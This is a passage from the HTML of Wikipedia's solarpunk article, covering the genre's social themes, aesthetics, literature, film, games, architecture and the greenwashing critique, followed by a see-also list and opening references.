<p>Solarpunk often includes elements of racial and <a href="https://en.wikipedia.org/wiki/Gender_equality" title="Gender equality">gender equality</a>, drawing this theme from earlier utopian works.<sup id="cite_ref-leguin_31-0"><a href="#cite_note-leguin-31"><span>[</span>31<span>]</span></a></sup>  <a href="https://en.wikipedia.org/wiki/Marge_Piercy" title="Marge Piercy">Marge Piercy</a>'s 1976 classic <i><a href="https://en.wikipedia.org/wiki/Woman_on_the_Edge_of_Time" title="Woman on the Edge of Time">Woman on the Edge of Time</a></i>, explored family roles and introduced the pronoun 'per'. <a href="https://en.wikipedia.org/wiki/Ursula_K._Le_Guin" title="Ursula K. Le Guin">Ursula K. Le Guin</a>'s 1969 book <i><a href="https://en.wikipedia.org/wiki/The_Left_Hand_of_Darkness" title="The Left Hand of Darkness">The Left Hand of Darkness</a></i> included gender fluidity.<sup id="cite_ref-32"><a href="#cite_note-32"><span>[</span>32<span>]</span></a></sup> Her book <i><a href="https://en.wikipedia.org/wiki/The_Dispossessed" title="The Dispossessed">The Dispossessed</a></i> eliminated compulsory monogamy.<sup id="cite_ref-leguin_31-1"><a href="#cite_note-leguin-31"><span>[</span>31<span>]</span></a></sup> <a href="https://en.wikipedia.org/wiki/Becky_Chambers" title="Becky Chambers">Becky Chambers</a>' 2021 solarpunk novel <i><a href="https://en.wikipedia.org/wiki/A_Psalm_for_the_Wild-Built" title="A Psalm for the Wild-Built">A Psalm for the Wild-Built</a></i> included a main character who is non-binary.
</p>
<div><h2 id="Art_movement_and_aesthetics">Art movement and aesthetics</h2><p><span><span>[</span><a href="https://en.wikipedia.org/w/index.php?title=Solarpunk&amp;action=edit&amp;section=8" title="Edit section: Art movement and aesthetics"><span>edit</span></a><span>]</span></span></p></div>
<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Solarpunk_Flag_Vectorized_Version.svg"><img alt="solarpunk flag" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Solarpunk_Flag_Vectorized_Version.svg/220px-Solarpunk_Flag_Vectorized_Version.svg.png" decoding="async" width="220" height="132" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Solarpunk_Flag_Vectorized_Version.svg/330px-Solarpunk_Flag_Vectorized_Version.svg.png 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Solarpunk_Flag_Vectorized_Version.svg/440px-Solarpunk_Flag_Vectorized_Version.svg.png 2x" data-file-width="512" data-file-height="307"></a><figcaption>A proposed flag of the solarpunk movement<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Manual_of_Style/Words_to_watch#Unsupported_attributions" title="Wikipedia:Manual of Style/Words to watch"><span title="The material near this tag may use weasel words or too-vague attribution. (October 2024)">according to whom?</span></a></i>]</sup></figcaption></figure>
<p>As an art movement, solarpunk emerged in the 2010s as a reaction to the prevalence of bleak <a href="https://en.wikipedia.org/wiki/Apocalyptic_and_post-apocalyptic_fiction" title="Apocalyptic and post-apocalyptic fiction">post-apocalyptic</a> and <a href="https://en.wikipedia.org/wiki/Dystopian_fiction" title="Dystopian fiction">dystopian</a> media alongside an increased awareness of social injustices, impacts of climate change, and inextricable <a href="https://en.wikipedia.org/wiki/Economic_inequality" title="Economic inequality">economic inequality</a>. As <a href="https://en.wikipedia.org/wiki/Apocalyptic_and_post-apocalyptic_fiction" title="Apocalyptic and post-apocalyptic fiction">post-apocalyptic</a> and <a href="https://en.wikipedia.org/wiki/Utopian_and_dystopian_fiction" title="Utopian and dystopian fiction">dystopian</a> was ubiquitous in media, solarpunk became an attractive alternative.<sup id="cite_ref-singularity_26-1"><a href="#cite_note-singularity-26"><span>[</span>26<span>]</span></a></sup> Solarpunk is optimistic yet realistic in confronting contemporary problems.<sup id="cite_ref-33"><a href="#cite_note-33"><span>[</span>33<span>]</span></a></sup>
</p>
<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Commando_Jugendstil_Solarpunk_Platform.jpg"><img alt="An image of a former oil platform at sea, repurposed as a greenhouse and powered by wind turbines. It's a representation of solarpunk values, repurposing infrastructure and getting rid of fossil fuels" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/Commando_Jugendstil_Solarpunk_Platform.jpg/220px-Commando_Jugendstil_Solarpunk_Platform.jpg" decoding="async" width="220" height="310" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/Commando_Jugendstil_Solarpunk_Platform.jpg/330px-Commando_Jugendstil_Solarpunk_Platform.jpg 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/Commando_Jugendstil_Solarpunk_Platform.jpg/440px-Commando_Jugendstil_Solarpunk_Platform.jpg 2x" data-file-width="709" data-file-height="1000"></a><figcaption>An image of a former oil platform at sea, repurposed as a greenhouse and powered by wind turbines</figcaption></figure>
<p>The solarpunk visual identity, as expressed by Olivia Louise and subsequent artists, is compared to <a href="https://en.wikipedia.org/wiki/Art_Nouveau" title="Art Nouveau">Art Nouveau</a> with its depictions of plants, use of sinuous lines like <a href="https://en.wikipedia.org/wiki/Whiplash_(decorative_art)" title="Whiplash (decorative art)">whiplash</a>, and integration of applied arts into fine arts. The ornamental <a href="https://en.wikipedia.org/wiki/Arts_and_Crafts_movement" title="Arts and Crafts movement">Arts and Crafts movement</a>, an influence on Art Nouveau, is present<sup id="cite_ref-34"><a href="#cite_note-34"><span>[</span>34<span>]</span></a></sup><sup id="cite_ref-e-flux_35-0"><a href="#cite_note-e-flux-35"><span>[</span>35<span>]</span></a></sup> and its built forms reflect <a href="https://en.wikipedia.org/wiki/Frank_Lloyd_Wright" title="Frank Lloyd Wright">Frank Lloyd Wright</a>'s <a href="https://en.wikipedia.org/wiki/Organic_architecture" title="Organic architecture">organic architecture</a>.<sup id="cite_ref-sciphijournal_24-1"><a href="#cite_note-sciphijournal-24"><span>[</span>24<span>]</span></a></sup> The solarpunk aesthetic typically utilizes natural colors, bright greens and blues, and allusions to diverse cultural origins. Examples of this aesthetic include Boeri Studio's <a href="https://en.wikipedia.org/wiki/Bosco_Verticale" title="Bosco Verticale">Bosco Verticale</a> in Milan, the depiction of <a href="https://en.wikipedia.org/wiki/Wakanda" title="Wakanda">Wakanda</a> in <a href="https://en.wikipedia.org/wiki/Marvel_Studios" title="Marvel Studios">Marvel Studios</a>' <i><a href="https://en.wikipedia.org/wiki/Black_Panther_(film)" title="Black Panther (film)">Black Panther</a></i> and Auroa in <i><a href="https://en.wikipedia.org/wiki/Tom_Clancy%27s_Ghost_Recon_Breakpoint" title="Tom Clancy's Ghost Recon Breakpoint">Tom Clancy's Ghost Recon Breakpoint</a></i>, <i><a href="https://en.wikipedia.org/wiki/Cities:_Skylines" title="Cities: Skylines">Cities: Skylines</a>'</i>s Green Cities expansion, and some <a href="https://en.wikipedia.org/wiki/Studio_Ghibli" title="Studio Ghibli">Studio Ghibli</a> movies, particularly <i><a href="https://en.wikipedia.org/wiki/Castle_in_the_Sky" title="Castle in the Sky">Castle in the Sky</a></i> and <a href="https://en.wikipedia.org/wiki/Nausica%C3%A4_of_the_Valley_of_the_Wind_(film)" title="Nausicaä of the Valley of the Wind (film)"><i>Nausicaä of the Valley of the Wind</i></a>.<sup id="cite_ref-PCGamer_36-0"><a href="#cite_note-PCGamer-36"><span>[</span>36<span>]</span></a></sup><sup id="cite_ref-:0_37-0"><a href="#cite_note-:0-37"><span>[</span>37<span>]</span></a></sup> Contrasted to cyberpunk, which is portrayed as having a dark, grim aesthetic surrounded by an artificial and domineering built environment reflective of alienation and subjugation, solarpunk is bright, with light often used as a motif and in imagery to convey feelings of cleanliness, abundance, and equability. However, light could alternatively be used to symbolize something that "subsumes everything beneath it, [an] emblem of tyranny [and] surveillance".<sup id="cite_ref-Williams_12-1"><a href="#cite_note-Williams-12"><span>[</span>12<span>]</span></a></sup>
</p>


<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg/220px-Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg" decoding="async" width="220" height="165" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg/330px-Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg/440px-Berlin_Friedrichstra%C3%9Fe_Utopia_2048_small_file.jpg 2x" data-file-width="7098" data-file-height="5315"></a><figcaption>An aerial view of a futuristic, sustainable Berlin—with lots of solar power, trees and greenery, airships, walkable streets, clean water. By Aerroscape &amp; Lino Zeddies.</figcaption></figure>
<p>In literature, solarpunk is a subgenre within science fiction, though it may also include elements of other types of <a href="https://en.wikipedia.org/wiki/Speculative_fiction" title="Speculative fiction">speculative fiction</a> such as fantasy and utopian fiction. It is a <a href="https://en.wikipedia.org/wiki/Cyberpunk_derivatives" title="Cyberpunk derivatives">cyberpunk derivative</a>, contrasted to <a href="https://en.wikipedia.org/wiki/Cyberpunk" title="Cyberpunk">cyberpunk</a> for its particular extrapolation of technology's impact on society and <a href="https://en.wikipedia.org/wiki/Progress" title="Progress">progress</a>. Cyberpunk characters are typically those marginalized by rapid technological change or subsumed by technology, while the solarpunk archetype has been described as a "maker-hero"<sup id="cite_ref-sciphijournal_24-2"><a href="#cite_note-sciphijournal-24"><span>[</span>24<span>]</span></a></sup> who has witnessed environmental disaster or failures by central authorities to adapt to crises or injustice, often in defense of nature<sup id="cite_ref-38"><a href="#cite_note-38"><span>[</span>38<span>]</span></a></sup> and in ways that allow the story to illustrate optimistic outcomes.<sup id="cite_ref-PCGamer_36-1"><a href="#cite_note-PCGamer-36"><span>[</span>36<span>]</span></a></sup> Its fictions illustrate feasible worlds that do not ignore the mechanics or ingredients of how it was arrived at.<sup id="cite_ref-e-flux_35-1"><a href="#cite_note-e-flux-35"><span>[</span>35<span>]</span></a></sup>
</p><p>Previously published novels that fit into this new genre included <a href="https://en.wikipedia.org/wiki/Ursula_K._Le_Guin" title="Ursula K. Le Guin">Ursula K. Le Guin</a>'s <i><a href="https://en.wikipedia.org/wiki/Always_Coming_Home" title="Always Coming Home">Always Coming Home</a></i> (1985)<sup id="cite_ref-Wenstrom_39-0"><a href="#cite_note-Wenstrom-39"><span>[</span>39<span>]</span></a></sup>  and <i><a href="https://en.wikipedia.org/wiki/The_Dispossessed" title="The Dispossessed">The Dispossessed</a></i> (1974), <a href="https://en.wikipedia.org/wiki/Ernest_Callenbach" title="Ernest Callenbach">Ernest Callenbach</a>'s <i><a href="https://en.wikipedia.org/wiki/Ecotopia" title="Ecotopia">Ecotopia</a></i> (1975), <a href="https://en.wikipedia.org/wiki/Kim_Stanley_Robinson" title="Kim Stanley Robinson">Kim Stanley Robinson</a>'s <i><a href="https://en.wikipedia.org/wiki/Three_Californias_Trilogy" title="Three Californias Trilogy">Pacific Edge</a></i> (1990), and <a href="https://en.wikipedia.org/wiki/Starhawk" title="Starhawk">Starhawk</a>'s <i><a href="https://en.wikipedia.org/wiki/The_Fifth_Sacred_Thing" title="The Fifth Sacred Thing">The Fifth Sacred Thing</a></i> (1993), largely for their depictions of contemporary worlds transitioning to more sustainable societies.<sup id="cite_ref-Johnson_25-4"><a href="#cite_note-Johnson-25"><span>[</span>25<span>]</span></a></sup> However, the first explicit entries published into the genre were the short stories in <a href="https://en.wikipedia.org/wiki/Anthology" title="Anthology">anthologies</a> <i>Solarpunk: Ecological and Fantastic Stories in a Sustainable World</i> (2012) (which was the third part of the publisher's trilogy of short story collections preceded by <i>Vaporpunk</i> and <i>Dieselpunk</i>),<sup id="cite_ref-40"><a href="#cite_note-40"><span>[</span>40<span>]</span></a></sup> <i>Wings of Renewal: A Solarpunk Dragons Anthology</i> (2015), <i>Sunvault: Stories of Solarpunk and Eco-Speculation</i> (2017) and <i>Glass and Gardens</i> (2018).<sup id="cite_ref-41"><a href="#cite_note-41"><span>[</span>41<span>]</span></a></sup> In 2018, author <a href="https://en.wikipedia.org/wiki/Becky_Chambers_(author)" title="Becky Chambers (author)">Becky Chambers</a> agreed to write two solarpunk novellas for <a href="https://en.wikipedia.org/wiki/Tor_Books" title="Tor Books">Tor Books</a> and published <i><a href="https://en.wikipedia.org/wiki/A_Psalm_for_the_Wild-Built" title="A Psalm for the Wild-Built">A Psalm for the Wild-Built</a></i> (2021) and <i><a href="https://en.wikipedia.org/wiki/A_Prayer_for_the_Crown-Shy" title="A Prayer for the Crown-Shy">A Prayer for the Crown-Shy</a></i> (2022).<sup id="cite_ref-42"><a href="#cite_note-42"><span>[</span>42<span>]</span></a></sup>
</p><p>In a 2019 <i>Slate</i> article, author <a href="https://en.wikipedia.org/wiki/Lee_Konstantinou" title="Lee Konstantinou">Lee Konstantinou</a> stated that solarpunk authors "...proclaim their commitment to "ingenuity, generativity, independence, and community", while going against the "nihilistic tendencies of cyberpunk and the reactionary tendencies of steampunk." He argues that solarpunk is aspirational, as it aims to provide "suggestions for the kind of science fiction or fantasy we ought to be writing".<sup id="cite_ref-43"><a href="#cite_note-43"><span>[</span>43<span>]</span></a></sup> Solarpunk can include elements of <a href="https://en.wikipedia.org/wiki/Mundane_science_fiction" title="Mundane science fiction">mundane science fiction</a>. In a <i>Solarpunk Futures</i> interview with <a href="https://en.wikipedia.org/wiki/Nina_Munteanu" title="Nina Munteanu">Nina Munteanu</a> about her solarpunk novel <i>A Diary in the Age of Water</i>, Munteanu said she incorporated elements of mundane science fiction to add "the gritty realism of the mundane" to the story.<sup id="cite_ref-Munteanu_44-0"><a href="#cite_note-Munteanu-44"><span>[</span>44<span>]</span></a></sup>
</p>

<p>As in written fiction, solarpunk themes in film predate the recognition of solarpunk as a genre and the aesthetics and themes of the genre are increasingly present in contemporary works. Many of the works of <a href="https://en.wikipedia.org/wiki/Hayao_Miyazaki" title="Hayao Miyazaki">Hayao Miyazaki</a> are recognized in hindsight as examples of early solarpunk cinema.<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed" title="Wikipedia:Citation needed"><span title="This claim needs references to reliable sources. (September 2024)">citation needed</span></a></i>]</sup> Additionally, the intersection of ecological stewardship and science fiction have also appeared in numerous western animated films such as <i><a href="https://en.wikipedia.org/wiki/Treasure_Planet" title="Treasure Planet">Treasure Planet</a></i> (2002), <i><a href="https://en.wikipedia.org/wiki/WALL-E" title="WALL-E">WALL-E</a></i> (2008), and <i><a href="https://en.wikipedia.org/wiki/Strange_World_(film)" title="Strange World (film)">Strange World</a></i> (2022).<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed" title="Wikipedia:Citation needed"><span title="This claim needs references to reliable sources. (September 2024)">citation needed</span></a></i>]</sup>
</p><p>Examples of live action solarpunk cinema include James Cameron's <i><a href="https://en.wikipedia.org/wiki/Avatar_(franchise)" title="Avatar (franchise)">Avatar</a></i> films and Benh Zeitlin's <i><a href="https://en.wikipedia.org/wiki/Beasts_of_the_Southern_Wild" title="Beasts of the Southern Wild">Beasts of the Southern Wild</a></i> (2012).
</p><p>In a study of the 44 most popular American <a href="https://en.wikipedia.org/wiki/Science_fiction_film" title="Science fiction film">science fiction films</a>, nature was found to be ignored in visions of the future, depicted in cities with <a href="https://en.wikipedia.org/wiki/Monoculture" title="Monoculture">monoculture</a> lawns and ornamental gardens. Nature is never portrayed in these films in an innovative or integrated way with future human civilization. At best, nature is simply portrayed as a background <a href="https://en.wikipedia.org/wiki/Motif_(visual_arts)" title="Motif (visual arts)">motif</a>. The study suggested for artists to "collaborate to imagine how to integrate nature and biodiversity into the depictions of future cities".<sup id="cite_ref-45"><a href="#cite_note-45"><span>[</span>45<span>]</span></a></sup>
</p>

<p>Alongside literature and visual art, solarpunk explorations within tabletop games have become increasingly visible.
</p><p><i><a href="https://en.wikipedia.org/wiki/Numenera" title="Numenera">Numenera</a></i> is <a href="https://en.wikipedia.org/wiki/Apocalyptic_and_post-apocalyptic_fiction" title="Apocalyptic and post-apocalyptic fiction">post-apocalyptic</a>, but does include punk elements by having authoritarian medieval European-style governments and a reliance on sustainable technology.
</p><p><i>Solarpunk 2050</i> Is a Solarpunk setting for <a href="https://en.wikipedia.org/wiki/Fate_(role-playing_game_system)" title="Fate (role-playing game system)"><i>Fate</i> (role-playing game system)</a> published in 2023. Set in the near future, society is being rebuilt after a climate catastrophe. Three factions struggle to agree on the right way to do this.
</p><p><i>Fully Automated!</i> is an open-source tabletop RPG set in the 22nd century in a post-scarcity post-capitalist society.
</p>

<p>Some, like solarpunk researcher Adam Flynn, worry that solarpunk can risk being <a href="https://en.wikipedia.org/wiki/Greenwashed" title="Greenwashed">greenwashed</a> through aesthetics that give the appearance of sustainability without addressing the root causes of actual <a href="https://en.wikipedia.org/wiki/Environmental_issues" title="Environmental issues">environmental issues</a>.<sup id="cite_ref-46"><a href="#cite_note-46"><span>[</span>46<span>]</span></a></sup> Flynn notes how depictions such as "luxury condos with a <a href="https://en.wikipedia.org/wiki/Green_roof" title="Green roof">green roof</a> that price out existing communities and might end up doing more environmental damage" is "fake solarpunk urbanism".<sup id="cite_ref-:1_47-0"><a href="#cite_note-:1-47"><span>[</span>47<span>]</span></a></sup>
</p>

<figure typeof="mw:File/Thumb"><a href="https://en.wikipedia.org/wiki/File:Bosco_verticale,_Milan,_Italy_(Unsplash).jpg"><img alt="building with green trees growing out of it" src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Bosco_verticale%2C_Milan%2C_Italy_%28Unsplash%29.jpg/220px-Bosco_verticale%2C_Milan%2C_Italy_%28Unsplash%29.jpg" decoding="async" width="220" height="331" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Bosco_verticale%2C_Milan%2C_Italy_%28Unsplash%29.jpg/330px-Bosco_verticale%2C_Milan%2C_Italy_%28Unsplash%29.jpg 1.5x, https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Bosco_verticale%2C_Milan%2C_Italy_%28Unsplash%29.jpg/440px-Bosco_verticale%2C_Milan%2C_Italy_%28Unsplash%29.jpg 2x" data-file-width="2000" data-file-height="3008"></a><figcaption>Building by Stefano Boeri, an example of Solarpunk-like architecture</figcaption></figure>
<p>Solarpunk architecture is characterized by combining natural elements with those of human society. It can be exemplified in small abodes that feature windmills or other green, diy off-grid technologies, as well as highly populated urban environments.<sup id="cite_ref-48"><a href="#cite_note-48"><span>[</span>48<span>]</span></a></sup>
</p><p>Real-life examples of solarpunk architecture include<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:No_original_research" title="Wikipedia:No original research"><span title="The material near this tag possibly contains original research. (February 2025)">original research?</span></a></i>]</sup> the <a href="https://en.wikipedia.org/wiki/Singapore_Botanic_Gardens" title="Singapore Botanic Gardens">Singapore Botanic Gardens</a>, which are one of only three gardens to be a UNESCO World Heritage Site;<sup id="cite_ref-49"><a href="#cite_note-49"><span>[</span>49<span>]</span></a></sup>Italy's <a href="https://en.wikipedia.org/wiki/Bosco_Verticale" title="Bosco Verticale">Bosco Verticale</a>, which, in 2014, became the world's first oxygen-positive skyscraper;<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed" title="Wikipedia:Citation needed"><span title="This claim needs references to reliable sources. (February 2025)">citation needed</span></a></i>]</sup> and Bolivia's <a href="https://en.wikipedia.org/wiki/Neo-Andean" title="Neo-Andean">Neo-Andean</a> architecture by <a href="https://en.wikipedia.org/wiki/Freddy_Mamani_(architect)" title="Freddy Mamani (architect)">Freddy Mamani</a>, which has successfully reclaimed traditional designs used by colonized peoples in a forward-thinking, sustainable way.<sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:Citation_needed" title="Wikipedia:Citation needed"><span title="This claim needs references to reliable sources. (February 2025)">citation needed</span></a></i>]</sup><sup>[<i><a href="https://en.wikipedia.org/wiki/Wikipedia:No_original_research" title="Wikipedia:No original research"><span title="The material near this tag possibly contains original research. (February 2025)">original research?</span></a></i>]</sup>
</p>

<ul><li><a href="https://en.wikipedia.org/wiki/Anarcho-primitivism" title="Anarcho-primitivism">Anarcho-primitivism</a></li>
<li><a href="https://en.wikipedia.org/wiki/Back-to-the-land_movement" title="Back-to-the-land movement">Back-to-the-land movement</a></li>
<li><a href="https://en.wikipedia.org/wiki/Climate_fiction" title="Climate fiction">Climate fiction</a></li>
<li><a href="https://en.wikipedia.org/wiki/Cottagecore" title="Cottagecore">Cottagecore</a></li>
<li><a href="https://en.wikipedia.org/wiki/Degrowth" title="Degrowth">Degrowth</a></li>
<li><a href="https://en.wikipedia.org/wiki/Ecocriticism" title="Ecocriticism">Ecocriticism</a></li>
<li><a href="https://en.wikipedia.org/wiki/Ecofiction" title="Ecofiction">Ecofiction</a></li>
<li><a href="https://en.wikipedia.org/wiki/Environmental_art" title="Environmental art">Environmental art</a></li>
<li><a href="https://en.wikipedia.org/wiki/Environmental_justice" title="Environmental justice">Environmental justice</a></li>
<li><a href="https://en.wikipedia.org/wiki/Green_anarchism" title="Green anarchism">Green anarchism</a></li>
<li><i><a href="https://en.wikipedia.org/wiki/Noor_(novel)" title="Noor (novel)">Noor</a></i> by <a href="https://en.wikipedia.org/wiki/Nnedi_Okorafor" title="Nnedi Okorafor">Nnedi Okorafor</a></li>
<li><a href="https://en.wikipedia.org/wiki/Open_Source_Ecology" title="Open Source Ecology">Open Source Ecology</a></li>
<li><a href="https://en.wikipedia.org/wiki/Rewilding_(conservation_biology)" title="Rewilding (conservation biology)">Rewilding (conservation biology)</a></li>
<li><a href="https://en.wikipedia.org/wiki/Social_ecology_(Bookchin)" title="Social ecology (Bookchin)">Social ecology</a></li>
<li><a href="https://en.wikipedia.org/wiki/Technogaianism" title="Technogaianism">Technogaianism</a></li>
<li><a href="https://en.wikipedia.org/wiki/Wakanda" title="Wakanda">Wakanda</a></li></ul>


<div><ol>
<li id="cite_note-1"><span><b><a href="#cite_ref-1">^</a></b></span> <span><cite id="CITEREFThompson2022">Thompson, Claire (2022-04-04). <a rel="nofollow" href="https://grist.org/fix/climate-fiction/do-you-believe-in-climate-solutions-you-just-might-be-a-solarpunk/">"Do you believe in climate solutions? You just might be a solarpunk"</a>. <i>Fix</i><span>. Retrieved <span>2022-10-18</span></span>. <q>For practical inspiration, solarpunk looks to permaculture and Indigenous agriculture, sustainable architecture like Earthships and Arcosanti, as well as the maker movement and DIY culture.</q></cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Fix&amp;rft.atitle=Do+you+believe+in+climate+solutions%3F+You+just+might+be+a+solarpunk.&amp;rft.date=2022-04-04&amp;rft.aulast=Thompson&amp;rft.aufirst=Claire&amp;rft_id=https%3A%2F%2Fgrist.org%2Ffix%2Fclimate-fiction%2Fdo-you-believe-in-climate-solutions-you-just-might-be-a-solarpunk%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-2"><span><b><a href="#cite_ref-2">^</a></b></span> <span><cite><a rel="nofollow" href="https://www.freethink.com/environment/earthships">"Earthships: The sustainable buildings made from trash"</a>. <i>Freethink</i>. 10 January 2022<span>. Retrieved <span>2022-10-18</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Freethink&amp;rft.atitle=Earthships%3A+The+sustainable+buildings+made+from+trash&amp;rft.date=2022-01-10&amp;rft_id=https%3A%2F%2Fwww.freethink.com%2Fenvironment%2Fearthships&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-3"><span><b><a href="#cite_ref-3">^</a></b></span> <span><cite><a rel="nofollow" href="https://lithub.com/hopepunk-and-solarpunk-on-climate-narratives-that-go-beyond-the-apocalypse/">"Hopepunk and Solarpunk: On Climate Narratives That Go Beyond the Apocalypse"</a>. 22 November 2019.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Hopepunk+and+Solarpunk%3A+On+Climate+Narratives+That+Go+Beyond+the+Apocalypse&amp;rft.date=2019-11-22&amp;rft_id=https%3A%2F%2Flithub.com%2Fhopepunk-and-solarpunk-on-climate-narratives-that-go-beyond-the-apocalypse%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-4"><span><b><a href="#cite_ref-4">^</a></b></span> <span><cite id="CITEREFReina-Rozo2021">Reina-Rozo, Juan David (2021). <a rel="nofollow" href="https://ojs.library.queensu.ca/index.php/IJESJP/article/view/14292">"Art, Energy and Technology: the Solarpunk Movement"</a>. <i>International Journal of Engineering, Social Justice, and Peace</i>. <b>8</b> (1): <span>47–</span>60. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.24908%2Fijesjp.v8i1.14292">10.24908/ijesjp.v8i1.14292</a></span>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/1927-9434">1927-9434</a>. <a href="https://en.wikipedia.org/wiki/S2CID_(identifier)" title="S2CID (identifier)">S2CID</a>&nbsp;<a rel="nofollow" href="https://api.semanticscholar.org/CorpusID:233805052">233805052</a>. <q>Solarpunk is a movement in speculative fiction, art, fashion, and activism that seeks to answer and embody the question 'what does a sustainable civilization look like, and how can we get there?'<span></span></q></cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=International+Journal+of+Engineering%2C+Social+Justice%2C+and+Peace&amp;rft.atitle=Art%2C+Energy+and+Technology%3A+the+Solarpunk+Movement&amp;rft.volume=8&amp;rft.issue=1&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E47-%3C%2Fspan%3E60&amp;rft.date=2021&amp;rft_id=https%3A%2F%2Fapi.semanticscholar.org%2FCorpusID%3A233805052%23id-name%3DS2CID&amp;rft.issn=1927-9434&amp;rft_id=info%3Adoi%2F10.24908%2Fijesjp.v8i1.14292&amp;rft.aulast=Reina-Rozo&amp;rft.aufirst=Juan+David&amp;rft_id=https%3A%2F%2Fojs.library.queensu.ca%2Findex.php%2FIJESJP%2Farticle%2Fview%2F14292&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-5"><span><b><a href="#cite_ref-5">^</a></b></span> <span><cite id="CITEREFAnderson-NatheCharles2020">Anderson-Nathe, Ben; Charles, Grant (2020). <a rel="nofollow" href="https://doi.org/10.1080%2F0145935X.2020.1789297">"The Radical Potential of the Imaginary"</a>. <i>Child &amp; Youth Services</i>. <b>41</b> (2): <span>105–</span>107. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.1080%2F0145935X.2020.1789297">10.1080/0145935X.2020.1789297</a></span>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/0145-935X">0145-935X</a>. <a href="https://en.wikipedia.org/wiki/S2CID_(identifier)" title="S2CID (identifier)">S2CID</a>&nbsp;<a rel="nofollow" href="https://api.semanticscholar.org/CorpusID:221051729">221051729</a>. <q>Solarpunk might be easiest understood as a response to environmental degradation and social conflict that centers hope and possibility rather than futility and despair. It is a relatively new expression and has popped up across genres: in art, literature, and activism.</q></cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Child+%26+Youth+Services&amp;rft.atitle=The+Radical+Potential+of+the+Imaginary&amp;rft.volume=41&amp;rft.issue=2&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E105-%3C%2Fspan%3E107&amp;rft.date=2020&amp;rft_id=https%3A%2F%2Fapi.semanticscholar.org%2FCorpusID%3A221051729%23id-name%3DS2CID&amp;rft.issn=0145-935X&amp;rft_id=info%3Adoi%2F10.1080%2F0145935X.2020.1789297&amp;rft.aulast=Anderson-Nathe&amp;rft.aufirst=Ben&amp;rft.au=Charles%2C+Grant&amp;rft_id=https%3A%2F%2Fdoi.org%2F10.1080%252F0145935X.2020.1789297&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
